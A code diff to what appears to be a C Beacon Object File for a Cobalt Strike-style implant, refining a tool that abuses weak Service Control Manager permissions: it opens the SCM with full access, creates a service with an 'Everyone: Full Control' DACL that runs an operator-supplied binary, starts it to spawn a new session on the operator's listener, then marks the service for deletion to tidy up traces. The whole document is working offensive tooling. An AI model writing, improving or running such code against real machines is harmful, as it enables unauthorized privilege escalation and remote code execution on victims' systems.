@@ -12,6 +12,7 @@ typedef BOOL     (WINAPI * DeleteService_t)(SC_HANDLE);
 typedef BOOL     (WINAPI * CloseServiceHandle_t)(SC_HANDLE);
 typedef BOOL     (WINAPI * ConvertStringSecurityDescriptorToSecurityDescriptorW_t)(LPCWSTR, DWORD, PSECURITY_DESCRIPTOR, PULONG);
 typedef HLOCAL   (WINAPI * LocalFree_t)(HLOCAL);
+typedef DWORD    (WINAPI * GetLastError_t)(void);  /* <-- added */
 
 /* SDDL Constant for "Everyone: Full Control" */
 #define SDDL_EVERYONE_FULL_CONTROL L"D:(A;;KA;;;WD)"
@@ -35,14 +36,17 @@ VOID go(IN PCHAR Buffer, IN ULONG Length)
     /* 1. Resolve APIs */
     OpenSCManagerW_t pOpenSCManagerW = (OpenSCManagerW_t)GetProcAddress(GetModuleHandleA("advapi32"), "OpenSCManagerW");
     CreateServiceW_t pCreateServiceW = (CreateServiceW_t)GetProcAddress(GetModuleHandleA("advapi32"), "CreateServiceW");
-    OpenServiceW_t pOpenServiceW = (OpenServiceW_t)GetProcAddress(GetModuleHandleA("advapi32"), "OpenServiceW");
-    StartServiceW_t pStartServiceW = (StartServiceW_t)GetProcAddress(GetModuleHandleA("advapi32"), "StartServiceW");
-    DeleteService_t pDeleteService = (DeleteService_t)GetProcAddress(GetModuleHandleA("advapi32"), "DeleteService");
+    OpenServiceW_t   pOpenServiceW   = (OpenServiceW_t)GetProcAddress(GetModuleHandleA("advapi32"), "OpenServiceW");
+    StartServiceW_t  pStartServiceW  = (StartServiceW_t)GetProcAddress(GetModuleHandleA("advapi32"), "StartServiceW");
+    DeleteService_t  pDeleteService  = (DeleteService_t)GetProcAddress(GetModuleHandleA("advapi32"), "DeleteService");
     CloseServiceHandle_t pCloseServiceHandle = (CloseServiceHandle_t)GetProcAddress(GetModuleHandleA("advapi32"), "CloseServiceHandle");
-    ConvertStringSecurityDescriptorToSecurityDescriptorW_t pConvertSDDL = (ConvertStringSecurityDescriptorToSecurityDescriptorW_t)GetProcAddress(GetModuleHandleA("advapi32"), "ConvertStringSecurityDescriptorToSecurityDescriptorW");
-    LocalFree_t pLocalFree = (LocalFree_t)GetProcAddress(GetModuleHandleA("kernel32"), "LocalFree");
+    ConvertStringSecurityDescriptorToSecurityDescriptorW_t pConvertSDDL =
+        (ConvertStringSecurityDescriptorToSecurityDescriptorW_t)GetProcAddress(GetModuleHandleA("advapi32"),
+        "ConvertStringSecurityDescriptorToSecurityDescriptorW");
+    LocalFree_t    pLocalFree    = (LocalFree_t)GetProcAddress(GetModuleHandleA("kernel32"), "LocalFree");
+    GetLastError_t pGetLastError = (GetLastError_t)GetProcAddress(GetModuleHandleA("kernel32"), "GetLastError"); /* <-- added */
 
-    if (!pOpenSCManagerW || !pCreateServiceW || !pStartServiceW || !pConvertSDDL) {
+    if (!pOpenSCManagerW || !pCreateServiceW || !pStartServiceW || !pConvertSDDL || !pGetLastError) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve APIs.");
         return;
     }
@@ -60,57 +64,64 @@ VOID go(IN PCHAR Buffer, IN ULONG Length)
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Target Service: %S", svcName);
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Binary Path:    %S", binPath);
 
-    /* 3. Open SCM with ALL_ACCESS (Requires the misconfiguration we found) */
+    /* 3. Open SCM with ALL_ACCESS */
     hScm = pOpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (!hScm) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] OpenSCManagerW failed. The SCManager likely does not have weak permissions.");
+        BeaconPrintf(CALLBACK_ERROR, "[-] OpenSCManagerW failed (err: %lu). SCManager likely does not have weak permissions.", pGetLastError());
         return;
     }
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Opened SCM with ALL_ACCESS.");
 
     /* 4. Convert SDDL to Security Descriptor */
     if (!pConvertSDDL(SDDL_EVERYONE_FULL_CONTROL, SDDL_REVISION_1, &pSD, NULL)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] SDDL conversion failed: %lu", GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "[-] SDDL conversion failed: %lu", pGetLastError());
         pCloseServiceHandle(hScm);
         return;
     }
 
-    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+    sa.nLength              = sizeof(SECURITY_ATTRIBUTES);
     sa.lpSecurityDescriptor = pSD;
-    sa.bInheritHandle = FALSE;
+    sa.bInheritHandle       = FALSE;
 
     /* 5. Create the Service with the Weak DACL */
     hSvc = pCreateServiceW(
-        hScm, 
-        svcName, 
-        NULL, 
-        SERVICE_ALL_ACCESS, 
-        SERVICE_WIN32_OWN_PROCESS, 
-        SERVICE_DEMAND_START, 
-        SERVICE_ERROR_IGNORE, 
-        binPath, 
+        hScm,
+        svcName,
+        NULL,
+        SERVICE_ALL_ACCESS,
+        SERVICE_WIN32_OWN_PROCESS,
+        SERVICE_DEMAND_START,
+        SERVICE_ERROR_IGNORE,
+        binPath,
         NULL, NULL, NULL, NULL, NULL
     );
 
     if (!hSvc) {
-        dwErr = GetLastError();
+        dwErr = pGetLastError();
         if (dwErr == ERROR_SERVICE_EXISTS) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[!] Service exists. Attempting to Open/Delete/Recreate...");
-            
+            BeaconPrintf(CALLBACK_OUTPUT, "[!] Service '%S' already exists. Attempting Open/Delete/Recreate...", svcName);
+
             hSvc = pOpenServiceW(hScm, svcName, SERVICE_ALL_ACCESS);
             if (hSvc) {
                 pDeleteService(hSvc);
                 pCloseServiceHandle(hSvc);
                 hSvc = NULL;
-                
-                // Attempt create again
-                hSvc = pCreateServiceW(hScm, svcName, NULL, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, binPath, NULL, NULL, NULL, NULL, NULL);
+
+                hSvc = pCreateServiceW(
+                    hScm, svcName, NULL,
+                    SERVICE_ALL_ACCESS,
+                    SERVICE_WIN32_OWN_PROCESS,
+                    SERVICE_DEMAND_START,
+                    SERVICE_ERROR_IGNORE,
+                    binPath,
+                    NULL, NULL, NULL, NULL, NULL
+                );
                 if (!hSvc) {
-                     BeaconPrintf(CALLBACK_ERROR, "[-] CreateService failed after deletion: %lu", GetLastError());
-                     goto cleanup;
+                    BeaconPrintf(CALLBACK_ERROR, "[-] CreateService failed after deletion: %lu", pGetLastError());
+                    goto cleanup;
                 }
             } else {
-                BeaconPrintf(CALLBACK_ERROR, "[-] OpenService failed for existing service: %lu", GetLastError());
+                BeaconPrintf(CALLBACK_ERROR, "[-] OpenService failed for existing service: %lu", pGetLastError());
                 goto cleanup;
             }
         } else {
@@ -118,33 +129,31 @@ VOID go(IN PCHAR Buffer, IN ULONG Length)
             goto cleanup;
         }
     }
-    
+
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Service Created with Weak DACL (Everyone: FullControl).");
 
     /* 6. Start the Service */
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting Service...");
     if (!pStartServiceW(hSvc, 0, NULL)) {
-        dwErr = GetLastError();
+        dwErr = pGetLastError();
         if (dwErr == ERROR_SERVICE_REQUEST_TIMEOUT) {
-             BeaconPrintf(CALLBACK_OUTPUT, "[!] StartService returned 1053 (Timeout). This is expected for non-service binaries.");
-             BeaconPrintf(CALLBACK_OUTPUT, "[+] Check your listener for a new session!");
+            BeaconPrintf(CALLBACK_OUTPUT, "[!] StartService returned 1053 (Timeout). Expected for non-service binaries.");
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Check your listener for a new session!");
         } else {
-             BeaconPrintf(CALLBACK_ERROR, "[-] StartService failed: %lu", dwErr);
+            BeaconPrintf(CALLBACK_ERROR, "[-] StartService failed: %lu", dwErr);
         }
     } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Service Started successfully.");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Service started successfully.");
     }
 
     /* 7. Mark Service for Deletion (Cleanup) */
     if (hSvc) {
-        // We mark for deletion. SCM will delete it after the process ends or next reboot.
-        // This keeps the registry clean.
-        pDeleteService(hSvc); 
+        pDeleteService(hSvc);
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Service marked for deletion.");
     }
 
 cleanup:
     if (hSvc) pCloseServiceHandle(hSvc);
     if (hScm) pCloseServiceHandle(hScm);
-    if (pSD) pLocalFree(pSD);
+    if (pSD)  pLocalFree(pSD);
 }
